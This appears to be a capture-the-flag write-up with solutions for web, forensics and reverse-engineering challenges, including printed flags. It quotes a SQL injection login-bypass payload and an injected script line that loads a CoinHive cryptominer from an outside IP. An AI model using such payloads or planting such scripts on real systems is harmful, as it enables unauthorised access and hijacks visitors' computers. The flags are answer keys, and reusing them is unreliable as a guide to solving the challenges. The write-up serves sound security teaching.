# Web
## Not Another SQLi Challenge
This challenge is meant to be an introduction to sql injection. For more information read the page on  
[SQL injection](https://en.wikipedia.org/wiki/SQL_injection)

`' OR '1'='1`


`gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}!`

# DriveByInc
## 0_intrusion
Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers. Over the past few years we moved to hosting a large portion of our business on a nice looking website. Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly. We hope that it is just because we added too much javascript but can you take a look for us just to make sure?

What is the full malicious line? (Including any HTML tags)
```<script src = http://10.187.195.95/js/colorbox.min.js></script><script>var color = new CoinHive.Anonymous("123456-asdfgh");color.start()</script></body>```

# 0_intrusion
## 0_intrusion
```
Use wireshark to filter the packets by length
The ip recieving the largest packets and suspected to be malware was 10.91.9.93
```


# Reverse Engineering
## Cheesy
Running file we can see that it is a ELF 64-bit LSB executable, dynamically linked
```file reversing1
reversing1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0d672b744b45bdc3f634cf144d1ae3f2a0f4509, not stripped
```
To get a better understanding of this program lets see what it does
```
QUFBQUFBQUFBQUFBQUFBQQ==
Hello! I bet you are looking for the flag..
I really like basic encoding.. can you tell what kind I used??
RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn
Q2FuIHlvdSByZWNvZ25pemUgYmFzZTY0Pz8=
RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn
WW91IGp1c3QgbWlzc2VkIHRoZSBmbGFn
```
Okay, we're given some different numbers in base64 encoding, let's try to see what these are...
```
echo "QUFBQUFBQUFBQUFBQUFBQQ==" | base64 -d
AAAAAAAAAAAAAAAA
echo "RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn" | base64 -d
FLAGflagFLAGflagFLAGflag
echo "Q2FuIHlvdSByZWNvZ25pemUgYmFzZTY0Pz8=" | base64 -d
Can you recognize base64??
echo "WW91IGp1c3QgbWlzc2VkIHRoZSBmbGFn" | base64 -d
You just missed the flag
```
So this challenge requires more than just being able to convert from base64, let's open it up in radare2

```
r2 reversing1
 -- No such file or directory.
[0x004009a0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[Invalid instruction of 1010 bytes at 0x400238
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x004009a0]> pdf @ sym.main
            ;-- main:
/ (fcn) sym.main 215
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_41h @ rbp-0x41
|           ; var int local_40h @ rbp-0x40
|           ; var int local_18h @ rbp-0x18
|           ; DATA XREF from entry0 (0x4009bd)
|           0x00400a96      55             push rbp
|           0x00400a97      4889e5         mov rbp, rsp
|           0x00400a9a      53             push rbx
|           0x00400a9b      4883ec48       sub rsp, 0x48               ; 'H'
|           0x00400a9f      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; '(' ; 40
|           0x00400aa8      488945e8       mov qword [local_18h], rax
|           0x00400aac      31c0           xor eax, eax
|           0x00400aae      be880c4000     mov esi, str.QUFBQUFBQUFBQUFBQUFBQQ ; 0x400c88 ; "QUFBQUFBQUFBQUFBQUFBQQ==\n"
|           0x00400ab3      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400ab8      e853feffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400abd      bea80c4000     mov esi, str.Hello__I_bet_you_are_looking_for_the_flag.. ; 0x400ca8 ; "Hello! I bet you are looking for the flag..\n"
|           0x00400ac2      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400ac7      e844feffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400acc      bed80c4000     mov esi, str.I_really_like_basic_encoding.._can_you_tell_what_kind_I_used ; 0x400cd8 ; "I really like basic encoding.. can you tell what kind I used??\n"
|           0x00400ad1      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400ad6      e835feffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400adb      be180d4000     mov esi, str.RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn ; 0x400d18 ; "RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn\n"
|           0x00400ae0      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400ae5      e826feffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400aea      be400d4000     mov esi, str.Q2FuIHlvdSByZWNvZ25pemUgYmFzZTY0Pz8 ; 0x400d40 ; "Q2FuIHlvdSByZWNvZ25pemUgYmFzZTY0Pz8=\n"
|           0x00400aef      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400af4      e817feffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400af9      be180d4000     mov esi, str.RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn ; 0x400d18 ; "RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn\n"
|           0x00400afe      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400b03      e808feffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400b08      488d45bf       lea rax, [local_41h]
|           0x00400b0c      4889c7         mov rdi, rax
|           0x00400b0f      e84cfeffff     call sym.std::allocator_char_::allocator
|           0x00400b14      488d55bf       lea rdx, [local_41h]
|           0x00400b18      488d45c0       lea rax, [local_40h]
|           0x00400b1c      be680d4000     mov esi, str.Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ ; 0x400d68 ; "Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ==\n"
|           0x00400b21      4889c7         mov rdi, rax
|           0x00400b24      e827feffff     call sym.std::__cxx11::basic_string_char_std::char_traits_char__std::allocator_char__::basic_string_charconst__std::allocator_char_const
|           0x00400b29      488d45bf       lea rax, [local_41h]
|           0x00400b2d      4889c7         mov rdi, rax
|           0x00400b30      e80bfeffff     call sym.std::allocator_char_::_allocator
|           0x00400b35      be900d4000     mov esi, str.WW91IGp1c3QgbWlzc2VkIHRoZSBmbGFn ; 0x400d90 ; "WW91IGp1c3QgbWlzc2VkIHRoZSBmbGFn\n"
|           0x00400b3a      bfa0206000     mov edi, obj._ZSt4cout__GLIBCXX_3.4 ; 0x6020a0
|           0x00400b3f      e8ccfdffff     call sym.std::basic_ostream_char_std::char_traits_char___std::operator___std::char_traits_char___std::basic_ostream_char_std::char_traits_char____charconst
|           0x00400b44      bb00000000     mov ebx, 0
|           0x00400b49      488d45c0       lea rax, [local_40h]
|           0x00400b4d      4889c7         mov rdi, rax
|           0x00400b50      e8cbfdffff     call sym.std::__cxx11::basic_string_char_std::char_traits_char__std::allocator_char__::_basic_string
|           0x00400b55      89d8           mov eax, ebx
|           0x00400b57      488b4de8       mov rcx, qword [local_18h]
|           0x00400b5b      6448330c2528.  xor rcx, qword fs:[0x28]
|       ,=< 0x00400b64      743b           je 0x400ba1
\      ,==< 0x00400b66      eb34           jmp loc.00400b9c
```
We can see that this is an ELF binary written in C++. We can see where all the system calls are made that output the base64 encoded strings. There's also some base64 that isn't being written to standard output.
```
echo "Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ==" | base64 -d
gigem{3a5y_R3v3r51N6!}
```

# 042
By examing this assembly code, the values being moved into the registers look like ascii.
```
	movb	$65, -16(%rbp) ## A
	movb	$53, -15(%rbp) ## 5
	movb	$53, -14(%rbp) ## 5
	movb	$51, -13(%rbp) ## 3
	movb	$77, -12(%rbp) ## M
	movb	$98, -11(%rbp) ## b 
	movb	$49, -10(%rbp) ## 1
	movb	$89, -9(%rbp)  ## Y
	movl	$0, -28(%rbp)  ## 0
	movl	$1, -32(%rbp)  ## 1
	movl	$2, -36(%rbp)  ## 2
```